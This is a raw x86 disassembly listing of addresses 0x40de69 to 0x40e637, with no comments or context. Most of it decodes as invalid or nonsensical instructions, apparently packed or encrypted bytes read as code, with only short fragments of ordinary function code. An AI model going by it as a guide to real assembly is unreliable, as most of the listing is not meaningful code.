  40de69:	push   ebx
  40de6a:	jae    0x40dee1
  40de6c:	scas   al,BYTE PTR es:[edi]
  40de6d:	aas    
  40de6e:	jo     0x40dedf
  40de70:	pusha  
  40de71:	lahf   
  40de72:	cmp    bl,al
  40de74:	push   ebx
  40de75:	pop    ss
  40de76:	or     edi,DWORD PTR [eax+0x0]
  40de79:	aad    0xd9
  40de7b:	out    dx,eax
  40de7c:	push   cs
  40de7d:	sbb    edi,ebx
  40de7f:	mov    ebx,0xdb1d2de8
  40de84:	pop    ecx
  40de85:	imul   ecx,DWORD PTR [ecx+edx*8-0x76840aa6],0x9f29b6f2
  40de90:	or     eax,0x19589121
  40de95:	retf   0x174b
  40de98:	clc    
  40de99:	inc    ebx
  40de9a:	(bad)  
  40de9b:	adc    ebx,DWORD PTR [edx+eax*2]
  40de9e:	fist   WORD PTR [esp+edi*4-0x24]
  40dea2:	mov    eax,ds:0xe81161ad
  40dea7:	mov    bl,0x5e
  40dea9:	inc    edx
  40deaa:	mov    ah,ah
  40deac:	gs retf 0xacf3
  40deb0:	pop    ebx
  40deb1:	inc    ebx
  40deb2:	fild   WORD PTR ds:0x9977ea72
  40deb8:	mov    ah,0xcc
  40deba:	xchg   esp,eax
  40debb:	test   esi,eax
  40debd:	rol    DWORD PTR [ebx-0x5eed972c],1
  40dec3:	jp     0x40df0f
  40dec5:	seta   cl
  40dec8:	ds pop ebp
  40deca:	pop    ds
  40decb:	inc    ecx
  40decc:	aam    0x72
  40dece:	test   al,0x5e
  40ded0:	adc    eax,0x4dadb91
  40ded5:	cmp    al,0x3f
  40ded7:	mov    al,0x2a
  40ded9:	test   al,0xbb
  40dedb:	(bad)
  40dede:	scas   eax,DWORD PTR es:[edi]
  40dedf:	push   cs
  40dee0:	xchg   BYTE PTR [esi],cl
  40dee2:	rcr    BYTE PTR ds:0x4f6fa6f1,cl
  40dee8:	gs retf 
  40deea:	(bad)
  40deed:	xor    ebx,edi
  40deef:	inc    esp
  40def0:	in     eax,0x6c
  40def2:	xor    al,0xc2
  40def4:	ja     0x40df41
  40def6:	cmc    
  40def7:	xchg   esi,eax
  40def8:	push   edi
  40def9:	mov    eax,0xb24350a9
  40defe:	daa    
  40deff:	je     0x40deea
  40df01:	sbb    DWORD PTR [edi],ecx
  40df03:	repnz test BYTE PTR ds:0x3f788abc,0xa7
  40df0b:	je     0x40df19
  40df0d:	iret   
  40df0e:	xchg   ebx,eax
  40df0f:	in     eax,dx
  40df10:	in     eax,dx
  40df11:	cmc    
  40df12:	inc    edx
  40df13:	pop    es
  40df14:	mov    al,fs:0x74720057
  40df1a:	add    eax,0x15c33ff
  40df1f:	xor    ebx,esi
  40df21:	call   0xf7b49a99
  40df26:	pop    ecx
  40df27:	or     DWORD PTR [ebp-0x3d06d118],ecx
  40df2d:	out    0xbe,eax
  40df2f:	rcl    DWORD PTR [ebx-0x60069afb],cl
  40df35:	mov    esi,0xca1a31a7
  40df3a:	push   edi
  40df3b:	or     DWORD PTR [esi-0x4],esi
  40df3e:	imul   edi,DWORD PTR [esi-0x4a],0xffffffc9
  40df42:	fdiv   st(6),st
  40df44:	cmp    BYTE PTR [ebp+0x53],al
  40df47:	repz pop DWORD PTR fs:[ebp+0x4f1f42d1]
  40df4f:	test   eax,0xee6f8622
  40df54:	div    DWORD PTR [eax]
  40df56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df58:	out    dx,al
  40df59:	pop    ds
  40df5a:	xor    eax,0x473e3c28
  40df5f:	test   BYTE PTR [edx-0x23],bl
  40df62:	mov    bh,0xb9
  40df64:	xchg   esp,eax
  40df65:	aam    0xba
  40df67:	nop
  40df68:	cmc    
  40df69:	fst    DWORD PTR [ebx-0x7c]
  40df6c:	ss mov bl,0x99
  40df6f:	add    DWORD PTR [eax-0x62],0x48
  40df73:	xor    esp,edx
  40df75:	push   ebp
  40df76:	and    al,0x2b
  40df78:	fld    DWORD PTR [edi+0x458b49cb]
  40df7e:	in     al,0xf
  40df80:	scas   eax,DWORD PTR es:[edi]
  40df81:	rol    DWORD PTR [ebx],0xe0
  40df84:	xchg   edx,eax
  40df85:	push   eax
  40df86:	xor    ebx,ebx
  40df88:	mov    edx,esp
  40df8a:	dec    edx
  40df8b:	inc    ebx
  40df8c:	add    ebx,DWORD PTR [edx+ebx*1]
  40df8f:	dec    ebx
  40df90:	xor    edx,edx
  40df92:	add    DWORD PTR [ebp-0xc],ebx
  40df95:	pop    ebx
  40df96:	jmp    0x40e0f4
  40df9b:	mov    BYTE PTR [eax+0x5d7fc57f],cl
  40dfa1:	pop    esp
  40dfa2:	pop    ebp
  40dfa3:	in     eax,0x25
  40dfa5:	pop    ebp
  40dfa6:	shl    DWORD PTR [ebx+0x20],1
  40dfa9:	sub    al,0xcc
  40dfab:	xchg   DWORD PTR [edi+0x7f3f7e7e],eax
  40dfb1:	jle    0x40e031
  40dfb3:	sbb    eax,0xe9b3a612
  40dfb8:	and    edx,DWORD PTR [eax]
  40dfba:	inc    edi
  40dfbb:	mov    gs,WORD PTR [ebx+0x3bf30588]
  40dfc1:	adc    DWORD PTR [edi],edi
  40dfc3:	aad    0x90
  40dfc5:	mov    DWORD PTR [ebx-0x3e37f999],esp
  40dfcb:	mov    cl,0x4a
  40dfcd:	sahf   
  40dfce:	call   0x34ea:0x71db2a90
  40dfd5:	(bad)  [ecx]
  40dfd7:	test   DWORD PTR [ecx-0x40],0x3216b13c
  40dfde:	out    0x90,eax
  40dfe0:	push   es
  40dfe1:	sahf   
  40dfe2:	or     BYTE PTR [edx+edi*8],bl
  40dfe5:	sahf   
  40dfe6:	call   0x37a073bf
  40dfeb:	cdq    
  40dfec:	jl     0x40df77
  40dfee:	mov    bl,0xe7
  40dff0:	psubb  mm2,QWORD PTR [eax+0x7cd5cb30]
  40dff7:	jecxz  0x40e072
  40dff9:	mov    bh,0xa7
  40dffb:	retf   0x366
  40dffe:	aad    0xb8
  40e000:	out    dx,eax
  40e001:	ret    
  40e002:	outs   dx,BYTE PTR ds:[esi]
  40e004:	mov    ds:0x531c1de5,eax
  40e009:	xchg   edi,eax
  40e00a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e00b:	mov    al,0x28
  40e00d:	push   0x58cab125
  40e012:	sbb    al,0x17
  40e014:	out    0x19,eax
  40e016:	mov    dh,BYTE PTR [ecx-0x55a6caed]
  40e01c:	or     edi,esi
  40e01e:	retf   0xc500
  40e021:	jae    0x40dfc6
  40e023:	outs   dx,BYTE PTR ds:[esi]
  40e024:	retf   0x138e
  40e027:	lea    ecx,[edi+0x4]
  40e02a:	fidiv  DWORD PTR [ebx+ebx*4-0x5a]
  40e02e:	dec    esp
  40e02f:	xchg   ebx,eax
  40e030:	cmc    
  40e031:	fiadd  DWORD PTR [edx-0x1a2f24c7]
  40e037:	arpl   WORD PTR [edx+eax*4],bp
  40e03a:	outs   dx,DWORD PTR ds:[esi]
  40e03b:	add    eax,0xfa365c86
  40e040:	pop    ebx
  40e041:	out    0x5a,eax
  40e043:	push   ecx
  40e044:	icebp  
  40e045:	cmc    
  40e046:	xchg   esi,eax
  40e047:	rol    BYTE PTR [ebp-0x39],1
  40e04a:	inc    ecx
  40e04b:	xchg   DWORD PTR [ebp-0x31],ecx
  40e04e:	push   edi
  40e04f:	pop    ebp
  40e050:	pop    edi
  40e051:	(bad)
  40e054:	or     BYTE PTR [esi],ch
  40e056:	sbb    BYTE PTR [ecx],al
  40e058:	ss (bad) 
  40e05a:	jo     0x40dff0
  40e05c:	icebp  
  40e05d:	mov    ss,WORD PTR [eax+0x48]
  40e060:	je     0x40e02d
  40e062:	rol    DWORD PTR [ecx+eax*4-0x7607bac8],1
  40e069:	xchg   ecx,eax
  40e06b:	cs es pop edx
  40e06e:	or     esp,edx
  40e070:	lods   al,BYTE PTR ds:[esi]
  40e071:	xchg   ebx,eax
  40e073:	push   edi
  40e074:	ret    0x87b4
  40e077:	outs   dx,DWORD PTR ds:[esi]
  40e078:	cld    
  40e079:	or     dh,al
  40e07b:	add    eax,0xa250cc7a
  40e080:	mov    eax,ds:0x24a90fb4
  40e085:	mov    esp,DWORD PTR [eax-0x6b]
  40e088:	xchg   esp,eax
  40e089:	sbb    dh,BYTE PTR [edi+ecx*8]
  40e08c:	sub    ecx,DWORD PTR [edi]
  40e08e:	ss in  eax,dx
  40e090:	xchg   edi,eax
  40e091:	cmc    
  40e092:	(bad)  
  40e093:	out    0xa8,eax
  40e095:	sbb    bl,BYTE PTR [edi]
  40e097:	ins    BYTE PTR es:[edi],dx
  40e098:	inc    ebx
  40e099:	pop    ebx
  40e09a:	fild   DWORD PTR [esi-0x2]
  40e09d:	retf   0xe74c
  40e0a0:	mov    al,ds:0x186c2646
  40e0a5:	arpl   WORD PTR cs:[ebx],sp
  40e0a8:	dec    edi
  40e0a9:	xchg   bp,ax
  40e0ab:	pop    ecx
  40e0ac:	fnstenv ds:0xba2c5501
  40e0b2:	adc    al,0xa3
  40e0b4:	fdivrp st(5),st
  40e0b6:	add    DWORD PTR [ebp-0x41dac542],edi
  40e0bc:	nop
  40e0bd:	or     al,0xb8
  40e0bf:	jns    0x40e06f
  40e0c1:	mov    bh,0x9b
  40e0c3:	cmp    ch,BYTE PTR cs:[esi-0x47]
  40e0c7:	cld    
  40e0c8:	fnstcw WORD PTR [edx+0x71]
  40e0cb:	add    al,0xec
  40e0cd:	inc    ecx
  40e0ce:	pop    eax
  40e0cf:	arpl   WORD PTR [ebp-0x29],di
  40e0d2:	arpl   WORD PTR [edx-0x57],cx
  40e0d5:	test   eax,0x38560b11
  40e0da:	fcom   DWORD PTR [eax-0x491dbfdb]
  40e0e0:	sbb    al,0xce
  40e0e2:	imul   esp,DWORD PTR [ecx+0x581f99c9],0x72
  40e0e9:	xor    al,BYTE PTR [esi]
  40e0eb:	cdq    
  40e0ec:	mov    eax,ds:0x9a20bed5
  40e0f1:	cs loopne 0x40e156
  40e0f4:	mov    eax,DWORD PTR [ebp-0xc]
  40e0f7:	pop    edi
  40e0f8:	pop    esi
  40e0f9:	pop    ebx
  40e0fa:	leave  
  40e0fb:	ret    0x10
  40e0fe:	dec    ebp
  40e0ff:	push   ebp
  40e100:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40e106:	mov    esp,ebp
  40e108:	or     ah,dh
  40e10a:	dec    ebp
  40e10b:	add    bh,al
  40e10d:	add    BYTE PTR [eax],cl
  40e10f:	add    BYTE PTR [eax],al
  40e111:	mov    DWORD PTR [eax],0x40f44545
  40e117:	xor    eax,0x9c8b8500
  40e11c:	hlt    
  40e11d:	clc    
  40e11e:	retf   
  40e11f:	(bad)  
  40e120:	enter  0x4d45,0xbc
  40e124:	mov    esi,DWORD PTR [edx]
  40e126:	hlt    
  40e127:	test   ebx,ecx
  40e129:	pushf  
  40e12a:	enter  0x4df8,0x8b
  40e12e:	mov    DWORD PTR [ebp-0x20],0x890208
  40e135:	inc    ebp
  40e136:	inc    ebp
  40e137:	cld    
  40e138:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e13e:	or     BYTE PTR [ebx+0x0],dl
  40e141:	mov    ebx,0x8bd5600
  40e146:	call   DWORD PTR [ecx-0x1]
  40e149:	pop    es
  40e14a:	mov    ch,0x33
  40e14c:	dec    ebx
  40e14e:	(bad)  
  40e14f:	mov    eax,0x72009da4
  40e154:	push   DWORD PTR [edx]
  40e156:	or     BYTE PTR [eax],al
  40e158:	jmp    0xff89:0x75c84d03
  40e15f:	dec    ebp
  40e160:	loopne 0x40e132
  40e162:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e168:	add    BYTE PTR [ebx],dh
  40e16a:	mov    ecx,ebx
  40e16c:	hlt    
  40e16d:	add    ecx,ebx
  40e16f:	enter  0x899d,0x32
  40e173:	dec    ebp
  40e174:	add    ecx,eax
  40e176:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e17c:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e183:	xor    ecx,ebx
  40e185:	retf   
  40e186:	enter  0x4d03,0xc8
  40e18a:	mov    DWORD PTR fs:[eax],ebx
  40e18d:	lea    eax,[eax]
  40e18f:	push   esp
  40e190:	mov    edi,edi
  40e192:	fs (bad) 
  40e194:	(bad)  
  40e195:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e19b:	push   0xffffffff
  40e19d:	and    bh,bh
  40e19f:	pop    ecx
  40e1a0:	inc    eax
  40e1a1:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e1a7:	push   0xffffff8b
  40e1a9:	pop    ecx
  40e1aa:	cld    
  40e1ab:	dec    ebp
  40e1ac:	lea    ecx,[ecx+0x45ff08ff]
  40e1b2:	mov    BYTE PTR [edx+0x1],cl
  40e1b5:	add    BYTE PTR [eax],al
  40e1b7:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e1be:	dec    DWORD PTR [ebp-0x77]
  40e1c1:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e1c8:	cld    
  40e1c9:	dec    ebp
  40e1ca:	jne    0x40e1ff
  40e1cc:	lea    eax,[ebx]
  40e1ce:	push   eax
  40e1cf:	mov    edi,edi
  40e1d1:	or     BYTE PTR [ecx+0x54a845],cl
  40e1d7:	add    al,ch
  40e1d9:	(bad)  
  40e1da:	sub    esp,ebp
  40e1dc:	add    BYTE PTR [eax],al
  40e1de:	rol    BYTE PTR [eax],0x84
  40e1e1:	inc    ebp
  40e1e2:	add    dh,BYTE PTR [esi+0x0]
  40e1e5:	add    BYTE PTR [ebp-0x73],al
  40e1e8:	mov    ebp,DWORD PTR [esp+edx*4]
  40e1eb:	inc    DWORD PTR [eax]
  40e1ed:	lea    ecx,[ebx-0x30074f4]
  40e1f3:	call   0x41ed78
  40e1f8:	add    BYTE PTR [ebp+0x0],cl
  40e1fb:	jne    0x40e23e
  40e1fd:	dec    DWORD PTR [ebx-0x76210314]
  40e203:	dec    ebp
  40e204:	add    DWORD PTR [ebp+0x0],esi
  40e207:	(bad)  
  40e208:	xchg   ebp,eax
  40e209:	loopne 0x40e20a
  40e20b:	inc    eax
  40e20c:	inc    DWORD PTR [eax]
  40e20e:	mov    ecx,DWORD PTR [ebp-0x4]
  40e211:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e217:	add    BYTE PTR [edx],dl
  40e219:	enter  0x4d90,0x0
  40e21d:	mov    eax,DWORD PTR [eax]
  40e21f:	hlt    
  40e220:	add    al,0xa5
  40e222:	mov    al,0xff
  40e224:	add    bh,bh
  40e226:	add    BYTE PTR [ebx],dh
  40e228:	inc    DWORD PTR [ebx]
  40e22a:	sbb    al,0x89
  40e22c:	jne    0x40e206
  40e22e:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e234:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e23a:	mov    DWORD PTR [eax-0x70],0xe058e189
  40e241:	inc    DWORD PTR [ebp-0x75]
  40e244:	ror    DWORD PTR [esi+ebp*8],1
  40e247:	test   DWORD PTR [esi-0x1],esp
  40e24a:	inc    ebp
  40e24b:	(bad)  
  40e24c:	aas    
  40e24d:	inc    ebp
  40e24e:	(bad)  
  40e24f:	lea    edi,[esp+eiz*2-0x1]
  40e253:	push   DWORD PTR [edi]
  40e255:	mov    DWORD PTR [ecx],esi
  40e257:	mov    al,ds:0x8b8000c7
  40e25c:	loopne 0x40e25a
  40e25e:	jmp    0xdfff:0xeeff458d
  40e265:	mov    bh,al
  40e267:	add    DWORD PTR [eax-0x1fba1500],ecx
  40e26d:	inc    DWORD PTR [ebp-0x4]
  40e270:	xlat   BYTE PTR ds:[ebx]
  40e271:	lea    edi,[edi]
  40e273:	inc    edi
  40e275:	jmp    FWORD PTR [eax-0x78]
  40e278:	inc    DWORD PTR [ecx]
  40e27a:	aaa    
  40e27b:	add    BYTE PTR [ecx],dh
  40e27d:	repnz mov DWORD PTR [eax],0xfff856c
  40e284:	ffreep st(5)
  40e286:	aas    
  40e287:	add    bh,al
  40e289:	mov    esi,DWORD PTR [eax-0x4]
  40e28c:	inc    DWORD PTR [eax+0xdf01ee]
  40e292:	(bad)  
  40e293:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e297:	mov    esp,ebx
  40e299:	xchg   esp,eax
  40e29a:	rol    DWORD PTR [eax],cl
  40e29c:	(bad)  
  40e29d:	mov    edi,DWORD PTR [eax+0x3]
  40e2a0:	(bad)  
  40e2a1:	cmp    al,0xd7
  40e2a3:	dec    ebp
  40e2a4:	lds    ecx,FWORD PTR [ebx+0x29d8e8]
  40e2aa:	add    BYTE PTR [ebp-0x3b375],cl
  40e2b0:	adc    BYTE PTR [edx+0x1],0x55
  40e2b4:	add    BYTE PTR [ebx+0x58c30],cl
  40e2ba:	add    BYTE PTR [ebx-0x778afc7b],cl
  40e2c0:	mov    eax,DWORD PTR [eax]
  40e2c2:	cld    
  40e2c3:	push   0x7d
  40e2c5:	dec    DWORD PTR [ebx+0xd88c]
  40e2cb:	push   edx
  40e2cc:	mov    edx,DWORD PTR [ecx-0x4]
  40e2cf:	call   DWORD PTR [eax+0x7d01fc]
  40e2d5:	mov    esp,DWORD PTR [esp+edi*8]
  40e2d8:	add    BYTE PTR [eax+0x560150],dl
  40e2de:	test   DWORD PTR [ebp+0x75],eax
  40e2e1:	jmp    0x947d:0xc7fce28b
  40e2e8:	mov    ebp,ebx
  40e2ea:	fcom   st(7)
  40e2ec:	add    bh,al
  40e2ee:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e2f4:	add    edi,edi
  40e2f6:	add    bh,bh
  40e2f8:	add    ah,cl
  40e2fa:	add    dh,dl
  40e2fc:	push   eax
  40e2fd:	inc    ebp
  40e2fe:	push   esi
  40e2ff:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e305:	test   BYTE PTR [ebx],dh
  40e307:	(bad)  
  40e308:	add    eax,0x4572cc
  40e30d:	jecxz  0x40e2d0
  40e30f:	rol    DWORD PTR [edi+eax*8-0x2eff73ff],cl
  40e316:	inc    esi
  40e317:	jle    0x40e319
  40e319:	test   edi,eax
  40e31b:	jmp    esp
  40e31d:	inc    DWORD PTR [eax]
  40e31f:	loope  0x40e321
  40e321:	(bad)  
  40e322:	jne    0x40e2a9
  40e324:	mov    edi,edi
  40e326:	cld    
  40e327:	inc    DWORD PTR [ebp-0x20]
  40e32a:	mov    ebp,edx
  40e32c:	mov    ah,0x85
  40e32e:	add    bh,bh
  40e330:	call   0x1170c34
  40e335:	int3   
  40e336:	mov    eax,DWORD PTR [ebp-0x7f0004]
  40e33c:	add    ebx,ebp
  40e33e:	add    al,ah
  40e340:	xor    BYTE PTR [ebp-0xff0085],al
  40e346:	mov    edx,ecx
  40e348:	cld    
  40e349:	jle    0x40e2d4
  40e34b:	push   ebx
  40e34c:	add    DWORD PTR [eax],eax
  40e34e:	add    BYTE PTR [eax+0x1],dl
  40e351:	inc    ebp
  40e352:	inc    ebp
  40e353:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e359:	dec    DWORD PTR [ebx-0x3fd90318]
  40e35f:	add    BYTE PTR [ebp-0xbf0040],dl
  40e365:	inc    ebp
  40e366:	retf   0x8b
  40e369:	cld    
  40e36a:	push   eax
  40e36b:	mov    al,0x45
  40e36d:	add    DWORD PTR [ebx+0x459c00],ecx
  40e373:	mov    edi,edi
  40e375:	mov    eax,0xe80800ff
  40e37a:	inc    ebp
  40e37b:	sub    DWORD PTR [ebx-0x47000400],ecx
  40e381:	add    al,0x1
  40e383:	rol    BYTE PTR [eax],0x1e
  40e386:	jne    0x40e3cd
  40e388:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e38e:	inc    DWORD PTR [ecx]
  40e390:	call   0x860b95
  40e395:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e39b:	call   0x410ca1
  40e3a0:	xor    bh,bh
  40e3a2:	push   edi
  40e3a3:	adc    BYTE PTR [ebx-0x747423bb],al
  40e3a9:	loopne 0x40e387
  40e3ab:	ret    
  40e3ac:	loopne 0x40e34b
  40e3ae:	xor    DWORD PTR [edx],0x31
  40e3b1:	cmp    edi,edi
  40e3b3:	bswap  esp
  40e3b5:	rol    BYTE PTR gs:[eax],0x5
  40e3b9:	jmp    0x12be503
  40e3be:	mov    eax,DWORD PTR [ebp-0x4]
  40e3c1:	add    BYTE PTR [eax+0xff0100],bh
  40e3c7:	cld    
  40e3c8:	jne    0x40e447
  40e3ca:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e3d0:	pusha  
  40e3d1:	add    DWORD PTR [eax],eax
  40e3d3:	add    BYTE PTR [eax-0x37],dl
  40e3d6:	inc    ebp
  40e3d7:	add    BYTE PTR [ebx+0x459850],cl
  40e3dd:	mov    edi,edi
  40e3df:	test   al,0xff
  40e3e1:	add    BYTE PTR [eax],cl
  40e3e3:	inc    DWORD PTR [ebp-0x18]
  40e3e6:	jmp    DWORD PTR ds:0x4d7d00dc
  40e3ec:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e3f2:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e3f8:	popf   
  40e3f9:	mov    eax,0x30132
  40e3fe:	lea    esi,[ebp+0x2c]
  40e401:	xor    edi,edi
  40e403:	(bad)  
  40e404:	call   0x1400c71
  40e409:	call   0x1350c99
  40e40e:	jne    0x40e39b
  40e410:	xor    edi,esp
  40e412:	add    eax,DWORD PTR [eax+0xc018d]
  40e418:	push   DWORD PTR [eax]
  40e41a:	call   0xca0c76
  40e41f:	int3   
  40e420:	inc    DWORD PTR [ebp-0x14]
  40e423:	mov    ecx,DWORD PTR [ebp-0x28]
  40e426:	xor    eax,DWORD PTR [eax]
  40e428:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e42e:	(bad)  
  40e42f:	xchg   ebp,eax
  40e430:	in     al,0xff
  40e432:	add    bh,bh
  40e434:	add    BYTE PTR [edi+0x508b0045],bl
  40e43a:	or     BYTE PTR [ebp-0x3d],al
  40e43d:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff63]
  40e444:	mov    edi,edi
  40e446:	or     BYTE PTR [eax],cl
  40e448:	inc    ebp
  40e449:	test   DWORD PTR gs:[eax],eax
  40e44c:	je     0x40e493
  40e44e:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e454:	xor    edx,DWORD PTR [eax-0x73]
  40e457:	push   ebp
  40e458:	or     BYTE PTR [ebp+0x21007572],al
  40e45e:	inc    ebp
  40e45f:	in     al,dx
  40e460:	mov    ebp,DWORD PTR [eax]
  40e462:	mov    esp,0x638bc345
  40e467:	fmul   st,st(5)
  40e469:	add    BYTE PTR [ebx],ch
  40e46b:	mov    eax,DWORD PTR [ebx]
  40e46d:	cld    
  40e46e:	loopne 0x40e430
  40e470:	inc    ebp
  40e471:	push   ebp
  40e472:	cmp    ebp,eax
  40e474:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e47b:	cld    
  40e47c:	fadd   DWORD PTR [eax+0x3b014d]
  40e482:	jne    0x40e4b4
  40e484:	push   0xf8898557
  40e489:	in     al,dx
  40e48a:	jne    0x40e4d1
  40e48c:	lea    eax,[ebx+0x72e8dcc8]
  40e492:	xor    BYTE PTR [ebx+0x7545bc00],cl
  40e498:	jmp    0x40e4cd
  40e49a:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e4a0:	xor    eax,edi
  40e4a2:	adc    DWORD PTR [ebp-0xcd0063],0x8b2b31
  40e4ac:	rcl    BYTE PTR [eax-0x40],1
  40e4af:	inc    ebp
  40e4b0:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e4b8:	inc    ebp
  40e4b9:	xchg   ebp,eax
  40e4ba:	ud0    ebp,DWORD PTR [ebx]
  40e4bd:	inc    DWORD PTR [eax]
  40e4bf:	adc    eax,0x508a0076
  40e4c4:	adc    BYTE PTR [ebp+0x1f],0x8b
  40e4c8:	or     al,0xf4
  40e4ca:	inc    eax
  40e4cb:	retf   
  40e4cc:	inc    ebp
  40e4cd:	iret   
  40e4ce:	jb     0x40e498
  40e4d0:	mov    eax,DWORD PTR [edi]
  40e4d2:	enter  0x4545,0x1
  40e4d6:	xor    eax,0x898b9c00
  40e4db:	mov    esp,0x33324df0
  40e4e0:	pushf  
  40e4e1:	lea    ecx,[ecx+0x4d72e008]
  40e4e7:	add    BYTE PTR [ebx],dh
  40e4e9:	inc    ebp
  40e4ea:	mov    DWORD PTR [ebx-0x3f621b4c],ecx
  40e4f0:	xor    dl,BYTE PTR [edx]
  40e4f2:	add    eax,DWORD PTR [ebp-0x77]
  40e4f5:	mov    eax,esp
  40e4f7:	fmul   DWORD PTR [ebp-0x3d]
  40e4fa:	xor    eax,DWORD PTR [ebx+eax*1+0x832899d]
  40e501:	mov    DWORD PTR [ebp-0x28],eax
  40e504:	aad    0x45
  40e506:	pushf  
  40e507:	xor    eax,edi
  40e509:	mov    ecx,0xff858db0
  40e50e:	clc    
  40e50f:	enter  0x4d45,0x30
  40e513:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e51a:	test   esi,edi
  40e51c:	clc    
  40e51d:	inc    DWORD PTR [ebp+0x45]
  40e520:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e528:	test   DWORD PTR ds:0xff459cf8,esi
  40e52e:	cmp    al,0xfc
  40e530:	pushf  
  40e531:	inc    ebp
  40e532:	mov    edx,DWORD PTR [eax-0x28]
  40e535:	popf   
  40e536:	push   ebp
  40e537:	add    BYTE PTR [ebx],dh
  40e539:	mov    DWORD PTR [ebx],eax
  40e53b:	sar    BYTE PTR [ebx],1
  40e53d:	adc    BYTE PTR [edi],cl
  40e53f:	dec    ebp
  40e540:	adc    al,0x8b
  40e542:	add    al,dl
  40e544:	jmp    0x101e714
  40e549:	jb     0x40e598
  40e54b:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e551:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e554:	xor    ecx,DWORD PTR [edi]
  40e556:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e55a:	(bad)  
  40e55c:	clc    
  40e55d:	enter  0x8400,0x8b
  40e561:	pop    es
  40e562:	mov    al,0x0
  40e564:	push   ebp
  40e565:	push   cs
  40e566:	xor    ecx,eax
  40e568:	xor    esp,ecx
  40e56a:	add    ebp,DWORD PTR [eax]
  40e56c:	add    esi,DWORD PTR [eax]
  40e56e:	(bad)  
  40e570:	retf   0x55c8
  40e573:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e577:	(bad)  
  40e578:	cli    
  40e579:	fdivr  st,st(1)
  40e57b:	test   DWORD PTR [eax+edi*8],ecx
  40e57e:	dec    ebp
  40e57f:	inc    ebp
  40e580:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e586:	add    BYTE PTR [ebp+0x0],al
  40e589:	mov    ecx,DWORD PTR [ebp-0x28]
  40e58c:	mov    ecx,ebx
  40e58e:	clc    
  40e58f:	jne    0x40e55c
  40e591:	mov    esi,0xd672d3
  40e596:	into   
  40e597:	into   
  40e598:	scas   eax,DWORD PTR es:[edi]
  40e599:	dec    ebp
  40e59a:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e5a0:	sub    ecx,esi
  40e5a2:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e5a5:	(bad)  
  40e5a6:	mov    edi,eax
  40e5a8:	mov    al,0x85
  40e5aa:	mov    eax,edi
  40e5ac:	add    BYTE PTR [ebp-0x75],al
  40e5af:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e5b6:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e5bc:	rdtsc  
  40e5be:	retf   0x559c
  40e5c1:	(bad)  
  40e5c2:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e5c9:	inc    ebp
  40e5ca:	add    eax,0xeb9c4d3f
  40e5cf:	(bad)  
  40e5d0:	mov    ecx,esp
  40e5d2:	lods   al,BYTE PTR ds:[esi]
  40e5d3:	test   DWORD PTR [ebp-0x8],edx
  40e5d6:	xor    ecx,DWORD PTR [ebp+0x33]
  40e5d9:	mov    eax,DWORD PTR [ebx]
  40e5db:	lock add ecx,ebx
  40e5de:	bswap  esi
  40e5e0:	retf   0x55d1
  40e5e3:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e5e9:	jmp    0x40e5e4
  40e5eb:	add    BYTE PTR ds:0xebc44d8b,al
  40e5f1:	push   ebp
  40e5f2:	mov    ebp,DWORD PTR [ebx]
  40e5f4:	test   al,0x8b
  40e5f6:	push   ebp
  40e5f7:	clc    
  40e5f8:	xor    ecx,ebx
  40e5fa:	xor    ecx,esi
  40e5fc:	add    edx,ecx
  40e5fe:	add    eax,DWORD PTR [edx+0xca010f]
  40e604:	push   ebp
  40e605:	dec    ebp
  40e606:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e60c:	stc    
  40e60d:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e613:	scas   eax,DWORD PTR es:[edi]
  40e614:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40e61a:	xor    ebp,DWORD PTR [ebx]
  40e61c:	xor    edi,DWORD PTR [ebx]
  40e61e:	add    esi,DWORD PTR [edi+0x3]
  40e621:	mov    ecx,DWORD PTR [edi]
  40e623:	clc    
  40e624:	retf   0x55cb
  40e627:	into   
  40e628:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e62f:	mov    eax,0x3376554d
  40e634:	mov    esi,DWORD PTR [ebx]
  40e636:	int3   
  40e637:	add    edx,DWORD PTR [ebp+0x3]
